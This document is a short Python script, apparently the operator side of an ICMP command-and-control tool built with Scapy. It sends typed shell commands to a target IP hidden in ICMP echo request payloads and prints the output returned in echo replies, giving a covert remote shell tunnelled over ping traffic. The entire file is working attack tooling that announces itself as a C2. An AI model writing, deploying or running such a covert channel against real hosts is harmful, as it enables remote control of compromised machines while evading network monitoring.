#!/usr/bin/env python3

from scapy.all import sr, IP, ICMP, Raw, sniff
from multiprocessing import Process
import argparse

# Variabili
ICMP_ID = int(0x1170)
TTL = int(64)

def check_scapy():
    try:
        from scapy.all import sr, IP, ICMP, Raw, sniff
    except ImportError:
        print("Installa the Scapy module")

parser = argparse.ArgumentParser()
parser.add_argument('-i', '--interface', type=str, required=True, help="Listener (virtual) Network Interface (e.g. eth0)")
parser.add_argument('-d', '--destination_ip', type=str, required=True, help="Destination IP address")
args = parser.parse_args()

def sniffO():
    sniff(iface=args.interface, prn=shell, filter="icmp", store=0)

def shell(pkt):
    if pkt[IP].src == args.destination_ip and pkt[ICMP].type == 0 and pkt[ICMP].id == ICMP_ID and pkt[Raw].load:
        icmppacket = (pkt[Raw].load).decode('utf-8', errors='ignore').replace('\n','')
        print(icmppacket)

def main():
    sniffing = Process(target=sniffO)
    sniffing.start()
    print("[+]ICMP C2 started!")
    while True:
        icmppacket = input("shell: ")
        if icmppacket == 'exit':
            print("[+]Stopping ICMP C2...")
            sniffing.terminate()
            break
        elif icmppacket == '':
            pass
        else:
            payload = IP(dst=args.destination_ip, ttl=TTL)/ICMP(type=8,id=ICMP_ID)/Raw(load=icmppacket)
            sr(payload, timeout=0, verbose=0)

if __name__ == "__main__":
    main()
